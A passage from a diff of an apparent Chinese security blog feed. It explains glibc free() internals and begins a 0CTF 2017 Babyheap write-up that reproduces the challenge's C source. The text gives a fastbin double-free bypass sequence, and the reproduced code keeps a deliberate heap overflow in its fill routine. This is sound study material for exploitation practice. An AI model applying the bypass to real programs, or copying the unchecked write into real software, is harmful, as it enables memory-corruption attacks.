-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fd = &amp;fastbinsY[index];</div><div class="line">old = *fd;</div></pre></td></tr></table></figure>
-<h4 id="2free-check"><a href="#2free-check" class="headerlink" title="2free check"></a>2free check</h4><p>fastbin中也有一个简单的对2free的check，如果<code>old == p</code>，则报2free的error(<code>double free or corruption(fasttop)</code>)</p>
-<p>逻辑很简单，old是在fastbin中的值，表示已经被free过，如果再free就是2free了</p>
-<p>要bypass也很简单：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">free</span>(a)</div><div class="line"><span class="built_in">free</span>(b)</div><div class="line"><span class="built_in">free</span>(a)</div></pre></td></tr></table></figure>
-<h4 id="单链表插入"><a href="#单链表插入" class="headerlink" title="单链表插入"></a>单链表插入</h4><p>fastbin是一个单向链表，所以下面就是单链表插入操作，逻辑也挺简单的：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p-&gt;fd = old</div><div class="line">fastbinsY[index] = p</div></pre></td></tr></table></figure>
-<p>PS: 实际代码这里很迷，是一个循环，但是我觉得是循环不起来的</p>
-<h4 id="fastbin-entry-check"><a href="#fastbin-entry-check" class="headerlink" title="fastbin entry check"></a>fastbin entry check</h4><p>最后是对fastbin entry进行检查，在单链表插入操作之前还有一个操作，如果<code>old!=NULL</code>，也就是说当前index的fastbin如果不是空链表，我们就要获取原本fastbinsY[index]的index，具体操作是<code>old_index = (old-&gt;chunksize &gt;&gt; 4) - 2</code>，最后再对两个index进行判断，如果<code>index != old_index</code>，则表示两个index不同的chunk竟然放在同一个链表中，肯定有问题啊，然后报错退出(<code>invalid fastbin entry (free)</code>)</p>
-<p>如果是free一个fastbin chunk的话，执行完上面的逻辑，free函数就可以return了，我们可以看到fastbin的free过程只做了一些简单的判断，然后只进行了单链表操作，对于inuse标志位却没有处理</p>
-<p>PS: 这之中还有一些的多线程情况下lock的问题，暂不研究</p>
-<h3 id="非fastbin的情况"><a href="#非fastbin的情况" class="headerlink" title="非fastbin的情况"></a>非fastbin的情况</h3><p>对smallbin, largenbin, unsortbin的操作都在这个分支中，基本流程如下：</p>
-<ol>
-<li>判断是否是使用mmap分配的内存空间</li>
-<li>获取下一个chunk的地址</li>
-<li>进行3个double free check</li>
-<li>获取下一个chunk的size，并对其进行check</li>
-<li>调用free_perturb函数，上面讲过</li>
-<li>前置合并操作，逻辑如下：<ol>
-<li>上一个chunk处于空闲状态</li>
-<li>获取上一个chunk的size，并加到当前chunk的size中去</li>
-<li>获取上一个chunk的地址</li>
-<li>unlink上一个chunk</li>
-</ol>
-</li>
-<li>判断下一个chunk是否是top chunk，如果是见下面流程，不是，跳到8<ol>
-<li>当前size加上下一个chunk的size</li>
-<li>把加好后的size赋值给当前chunk的size</li>
-<li>arena执行top chunk的指针改指向当前chunk</li>
-</ol>
-</li>
-<li>判断下一个chunk是否是空闲状态，如果是见下面流程，如果不是，跳到9<ol>
-<li>unlink下一个chunk</li>
-<li>当前size加上下一个chunk的size</li>
-</ol>
-</li>
-<li>清除下一个chunk的inuse标志位</li>
-<li>获取unsortbin地址</li>
-<li>获取unsortbin-&gt;fd地址</li>
-<li>进行unsort chunk check</li>
-<li>当前chunk-&gt;fd = unsortbin-&gt;fd</li>
-<li>当前chunk-&gt;bk = unsortbin</li>
-<li>如果当前chunk不是smallbin，把fd_nextsize/bk_nextsize清零</li>
-<li>unsortbin-&gt;fd-&gt;bk = 当前chunk</li>
-<li>unsortbin-&gt;fd = 当前chunk</li>
-<li>设置当前chunk的size，inuse标志位为1，设置下一个chunk的pre_size</li>
-<li>如果size&gt;65536则…….</li>
-</ol>
-<h4 id="double-free-check"><a href="#double-free-check" class="headerlink" title="double free check"></a>double free check</h4><p>共有三个check，首先是当前chunk不能是top chunk，也就是top chunk不能被free，第二个check是检查下一个chunk的地址不能大于top chunk的地址加上top chunk的size，因为在brk分配得到的一个堆中，top chunk是末尾的chunk，所以top chunk之后是不存在其他chunk的，第三个是检查下一个chunk的inuse标志位，只有当前chunk是inuse状态，才能被free。</p>
-<p>之后是对下一个chunk的size进行check，也就是上下限检查。</p>
-<h4 id="前向合并操作"><a href="#前向合并操作" class="headerlink" title="前向合并操作"></a>前向合并操作</h4><p>如果上一个chunk是处于空闲状态，当前chunk就要和上一个chunk进行合并。逻辑也很简单，因为上一次chunk是处于空闲状态，所以当前chunk的pre_size可以获取到上一个chunk的size，和当前chunk的size相加，形成新的size，当前chunk的地址减去pre_size，获得上一个chunk的地址，而上一个chunk的地址将赋值给当前chunk。然后对上一个chunk进行unlink操作，把上一个chunk从bin的链表中删除。</p>
-<h4 id="向后合并操作"><a href="#向后合并操作" class="headerlink" title="向后合并操作"></a>向后合并操作</h4><p>向后合并操作有两种情况，一种是下一chunk是处于空闲状态的chunk，另一种是下一个chunk是top chunk。如果下一个chunk是top chunk，首先获取到下一个chunk的size加上当前chunk的size形成新的size，并储存到当前chunk的size位，然后把arena的top chunk指针设置成当前chunk的地址，这样就完成了把当前chunk合并进top chunk的操作。</p>
-<p>可以通过下下个chunk的inuse标志位判断下一个chunk是否处于空闲状态，如果处于inuse状态，这把下一个chunk的inuse标志位置零，表示当前chunk处于空闲状态，如果下一个chunk处于空闲状态，则需要进行向后合并操作。首先是unlink下一个chunk，把下一个chunk从bin的链表中删去，然后当前size加上下一个chunk的size。</p>
-<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><p>首先是获取下一个chunk的pre_size，和当前chunk的size进行比较，因为传入unlink的chunk都是处于空闲状态，所以下一个chunk的pre_size位是有效值。之后是进行一个比较经典的check：<code>P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P</code>，当该check通过后就是删除当前链表的操作了：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P-&gt;fd = FD</div><div class="line">P-&gt;bk = BK</div></pre></td></tr></table></figure>
-<p>这些都算是链表中比较经典的操作了。</p>
-<p>然后是，如果当前chunk是largebin，还会对<code>fd_nextsize</code>和<code>bk_nextsize</code>进行一些操作。这两个也是指针变量，但是在free函数中基本没有对这两个指针进行操作赋值，所以还不清楚具体含义，等看完malloc函数再进行研究。</p>
-<h4 id="把当前chunk加入到unsortbin中"><a href="#把当前chunk加入到unsortbin中" class="headerlink" title="把当前chunk加入到unsortbin中"></a>把当前chunk加入到unsortbin中</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="number">1678</span>	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></div><div class="line">1679	&#123;</div><div class="line"><span class="number">1680</span>	  <span class="comment">/* Serialize access.  */</span></div><div class="line"><span class="number">1681</span>	  __libc_lock_define (, mutex);</div><div class="line"><span class="number">1682</span>	</div><div class="line"><span class="number">1683</span>	  <span class="comment">/* Flags (formerly in max_fast).  */</span></div><div class="line"><span class="number">1684</span>	  <span class="keyword">int</span> flags;</div><div class="line"><span class="number">1685</span>	</div><div class="line"><span class="number">1686</span>	  <span class="comment">/* Fastbins */</span></div><div class="line"><span class="number">1687</span>	  mfastbinptr fastbinsY[NFASTBINS];</div><div class="line"><span class="number">1688</span>	</div><div class="line"><span class="number">1689</span>	  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></div><div class="line"><span class="number">1690</span>	  mchunkptr top;</div><div class="line"><span class="number">1691</span>	</div><div class="line"><span class="number">1692</span>	  <span class="comment">/* The remainder from the most recent split of a small request */</span></div><div class="line"><span class="number">1693</span>	  mchunkptr last_remainder;</div><div class="line"><span class="number">1694</span>	</div><div class="line"><span class="number">1695</span>	  <span class="comment">/* Normal bins packed as described above */</span></div><div class="line"><span class="number">1696</span>	  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</div><div class="line"><span class="number">1697</span>	</div><div class="line"><span class="number">1698</span>	  <span class="comment">/* Bitmap of bins */</span></div><div class="line"><span class="number">1699</span>	  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</div><div class="line"><span class="number">1700</span>	</div><div class="line"><span class="number">1701</span>	  <span class="comment">/* Linked list */</span></div><div class="line"><span class="number">1702</span>	  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></div><div class="line"><span class="number">1703</span>	</div><div class="line"><span class="number">1704</span>	  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></div><div class="line">1705	     by free_list_lock in arena.c.  */</div><div class="line"><span class="number">1706</span>	  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></div><div class="line"><span class="number">1707</span>	</div><div class="line"><span class="number">1708</span>	  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></div><div class="line">1709	     the free list.  Access to this field is serialized by</div><div class="line">1710	     free_list_lock in arena.c.  */</div><div class="line"><span class="number">1711</span>	  INTERNAL_SIZE_T attached_threads;</div><div class="line"><span class="number">1712</span>	</div><div class="line"><span class="number">1713</span>	  <span class="comment">/* Memory allocated from the system in this arena.  */</span></div><div class="line"><span class="number">1714</span>	  INTERNAL_SIZE_T system_mem;</div><div class="line"><span class="number">1715</span>	  INTERNAL_SIZE_T max_system_mem;</div><div class="line"><span class="number">1716</span>	&#125;;</div></pre></td></tr></table></figure>
-<p>这是arena的结构体，其中fastbinsY数组存放的是fastbin，而bins数组中存放的是unsortbin，smallbin和largebin，其中bins[0]和bins[1]存放的是unsortbin。</p>
-<p>在free函数中，free一个chunk，是把他放入到unsortbin之中。源代码中是这样的两句：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">4333</span>	      bck = unsorted_chunks(av);</div><div class="line"><span class="number">4334</span>	      fwd = bck-&gt;fd;</div></pre></td></tr></table></figure>
-<p>链表插入的操作:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">4340</span>	      p-&gt;fd = fwd;</div><div class="line"><span class="number">4341</span>	      p-&gt;bk = bck;</div><div class="line">......</div><div class="line"><span class="number">4347</span>	      bck-&gt;fd = p;</div><div class="line"><span class="number">4348</span>	      fwd-&gt;bk = p;</div></pre></td></tr></table></figure>
-<p>其中，bck的值为arena中top chunk的地址，fwd是bins[0]的值，arena的结构如下，</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">top chunk</th>
-<th style="text-align:center">last_remainder</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">bins[0]</td>
-<td style="text-align:center">bins[1]</td>
-</tr>
-</tbody>
-</table>
-<p>上面这样的结构形成一个chunk和当前chunk形成一个双向循环链表</p>
-<p>当largenbin的情况，会吧<code>fd_nextsize</code>和<code>bk_nextsize</code>置空(NULL)</p>
-<p>最后就是设置当前chunk的inuse标志位和更新size，并设置下一个chunk的pre_size</p>
-<p>所以chunk在进行free操作后，如果存在上一个chunk，肯定是处于inuse状态，如果不是上面就和当前chunk合并了，同理下一个也肯定是处于inuse状态的chunk</p>
-<p>最后，当<code>size&gt;65536</code>时还会有一波猜测，大致过了一遍，是处理arena的，所以暂不做研究.</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次看free代码虽然花了挺长时间，但是其实代码挺简单的，主要是三天打鱼两天晒网的缘故。最难看懂的代码应该是内联汇编了，比如这句：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">4255</span>	    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</div></pre></td></tr></table></figure>
-<p>看了半天这内联汇编实在是难看，也不好理解，最后我把自己电脑上的libc.so，丢到ida中，找到这句对应的汇编，就好理解多了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cmpxchg [rdx], rbx</div></pre></td></tr></table></figure>
-]]></content:encoded>
-      
-      <comments>http://0x48.pw/2017/08/07/0x37/#disqus_thread</comments>
-    </item>
+  </div>
+  
     
-    <item>
-      <title>堆溢出学习之0CTF 2017 Babyheap</title>
-      <link>http://0x48.pw/2017/08/01/0x36/</link>
-      <guid>http://0x48.pw/2017/08/01/0x36/</guid>
-      <pubDate>Tue, 01 Aug 2017 14:12:10 GMT</pubDate>
-      <description>
-      
-        &lt;p&gt;最近在学习堆, 看了&lt;a href=&quot;https://github.com/shellphish/how2heap&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;how2heap&lt;/a&gt;上的&lt;code&gt;fastbin_dup&lt;/code&gt;，例子都还挺简单的，然后学做了下0CTF 2017的Babyheap，然后开启了新大陆，发现我以前根本就不会Pwn……&lt;/p&gt;
-      
-      </description>
-      
-      <content:encoded><![CDATA[<p>最近在学习堆, 看了<a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a>上的<code>fastbin_dup</code>，例子都还挺简单的，然后学做了下0CTF 2017的Babyheap，然后开启了新大陆，发现我以前根本就不会Pwn……</p>
-<a id="more"></a>
-<h1 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h1><p>先说下how2heap上的例子，一个是<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="external">fastbin_dup.c</a>还有一个是<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">fastbin_dup_into_stack</a></p>
-<p>其实这两个例子挺简单的，看懂我上一篇讲fastbin的blog，对着代码看看应该很容易理解，第一个其实就是演示下fastbin的2free，第二个是演示利用fastbin的2free，malloc出一个特定的地址，很简单的，其实就是通过修改fastbin的fd，太简单了就不多讲了…</p>
-<h1 id="Babyheap"><a href="#Babyheap" class="headerlink" title="Babyheap"></a>Babyheap</h1><p>题目我github上有: <a href="https://github.com/Hcamael/CTF_repo/tree/master/0CTF%202017/Pwn10(Baby%20Heap%202017)" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/0CTF%202017/Pwn10(Baby%20Heap%202017)</a></p>
-<p>这题是有个libc库的，这题的难点在哪？我觉得就是开了PIE保护，地址随机化，之前我blog中做的那些题我们是可以知道bin中的地址的，比如<code>got</code>表，<code>plt</code>表啊，<code>.bss</code>或者<code>.data</code>里啥变量的地址啊，那都是在没开PIE的情况，当开了PIE，任何地址我们都是未知的。</p>
-<p>还有一个难点就是调试不好调试(我最近从peda换成了pwndbg)，有两个难点，首先是有个alarm，每次调试的时候都要跳过执行这个函数，要不然就在bin中patch掉这个函数，还有个应该是因为PIE的原因，调用一个函数的时候pwndbg没办法帮我显示函数命了，害我还要去查这个函数是malloc还是free。这两个太影响我调试的进度了，所以我根据bin复现了一个逻辑相同的源码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">list</span>[<span class="number">16</span>*<span class="number">3</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"1. Allocate"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"2. Fill"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"3. Free"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"4. Dump"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"5. Exit"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Command: "</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_str</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> len)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> tmp, x, r;</div><div class="line">    <span class="keyword">char</span> buf;</div><div class="line">    <span class="keyword">if</span> (len)&#123;</div><div class="line">        tmp = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span>(len<span class="number">-1</span> &gt; tmp)&#123;</div><div class="line">            x = read(<span class="number">0</span>, &amp;buf, <span class="number">1</span>);</div><div class="line">            <span class="keyword">if</span> (x&gt;<span class="number">0</span>)&#123;</div><div class="line">                <span class="keyword">if</span>(buf==<span class="number">10</span>)</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                *(s+tmp) = buf;</div><div class="line">                tmp++;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        *(s+tmp) = <span class="number">0</span>;</div><div class="line">        r = tmp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        r = <span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> r;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">read_int</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> s[<span class="number">8</span>];</div><div class="line">    read_str(&amp;s, <span class="number">8</span>);</div><div class="line">    <span class="keyword">return</span> atol(s);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">alloca_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">char</span> *add;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=<span class="number">15</span>; i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (!<span class="built_in">list</span>[i*<span class="number">24</span>])&#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</div><div class="line">            n = read_int();</div><div class="line">            <span class="keyword">if</span>(n &gt; <span class="number">0</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span> (n &gt; <span class="number">4096</span>)</div><div class="line">                    n = <span class="number">4096</span>;</div><div class="line">                add = <span class="built_in">calloc</span>(n, <span class="number">1</span>);</div><div class="line">                <span class="keyword">if</span> (!add)</div><div class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">                <span class="built_in">list</span>[<span class="number">24</span>*i] = <span class="number">1</span>;</div><div class="line">                <span class="built_in">list</span>[<span class="number">24</span>*i + <span class="number">8</span>] = n;</div><div class="line">                <span class="built_in">list</span>[<span class="number">24</span>*i + <span class="number">16</span>] = add;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Allocate Index %d\n"</span>, i);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">fill_data</span><span class="params">(<span class="keyword">long</span> index, <span class="keyword">long</span> len)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> n, m, r;</div><div class="line">    <span class="keyword">if</span>(len)&#123;</div><div class="line">        n = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> (n &lt; len)&#123;</div><div class="line">            m = read(<span class="number">0</span>, <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>], len-n);</div><div class="line">            <span class="keyword">if</span> (m &gt; <span class="number">0</span>)</div><div class="line">                n += m;</div><div class="line">            <span class="keyword">else</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        r = n;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        r = <span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> r;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fill_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> result, index;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</div><div class="line">    result = read_int();</div><div class="line">    index = result;</div><div class="line">    <span class="keyword">if</span> ((result &amp; <span class="number">0x80000000</span>) == <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span>)</div><div class="line">    &#123;</div><div class="line">        result = <span class="built_in">list</span>[result*<span class="number">24</span>];</div><div class="line">        <span class="keyword">if</span> (result == <span class="number">1</span>)&#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</div><div class="line">            result = read_int();</div><div class="line">            <span class="keyword">if</span> (result &gt; <span class="number">0</span>)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</div><div class="line">                result = fill_data(index, result);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> r, index;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</div><div class="line">    r = read_int();</div><div class="line">    index = r;</div><div class="line">    <span class="keyword">if</span> (r &gt;= <span class="number">0</span> &amp;&amp; r &lt;= <span class="number">15</span>)&#123;</div><div class="line">        r = <span class="built_in">list</span>[index*<span class="number">24</span>];</div><div class="line">        <span class="keyword">if</span> (r == <span class="number">1</span>)&#123;</div><div class="line">            <span class="built_in">list</span>[index*<span class="number">24</span>] = <span class="number">0</span>;</div><div class="line">            <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">8</span>] = <span class="number">0</span>;</div><div class="line">            <span class="built_in">free</span>(<span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>]);</div><div class="line">            <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">write_data</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> len)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> n;</div><div class="line">    <span class="keyword">int</span> s;</div><div class="line">    n = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(n &lt; len)</div><div class="line">    &#123;</div><div class="line">        s = write(<span class="number">1</span>, addr+n, len-n);</div><div class="line">        <span class="keyword">if</span> (s &gt; <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            n += s;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> n;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dump_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> r, index;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</div><div class="line">    r = read_int();</div><div class="line">    index = r;</div><div class="line">    <span class="keyword">if</span> (r &gt;=<span class="number">0</span> &amp;&amp; r &lt;=<span class="number">15</span>)</div><div class="line">    &#123;</div><div class="line">        r = <span class="built_in">list</span>[index*<span class="number">24</span>];</div><div class="line">        <span class="keyword">if</span> (r == <span class="number">1</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"Content: "</span>);</div><div class="line">            write_data(<span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>], <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">8</span>]);</div><div class="line">            <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> n;</div><div class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</div><div class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</div><div class="line">    <span class="keyword">for</span>(;;)&#123;</div><div class="line">        menu();</div><div class="line">        n = read_int();</div><div class="line">        <span class="keyword">switch</span>(n)&#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">1</span>: alloca_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">2</span>: fill_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">3</span>: free_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">4</span>: dump_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">5</span>: <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div 